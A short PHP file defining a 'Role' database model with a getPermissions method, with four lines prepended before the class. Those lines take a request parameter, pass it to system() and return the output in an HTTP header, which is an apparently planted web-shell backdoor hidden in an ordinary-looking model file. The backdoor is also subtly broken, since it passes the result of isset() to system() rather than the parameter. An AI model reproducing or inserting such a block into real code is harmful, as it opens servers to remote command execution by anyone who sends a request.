<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
use Hazzard\Database\Model;

class Role extends Model {
	
	protected $table = 'roles';

	protected $guarded = array('id');

	public static function getPermissions($id)
	{
		$permissions = static::where('id', $id)->pluck('permissions');

		return explode(',', $permissions);
	}
}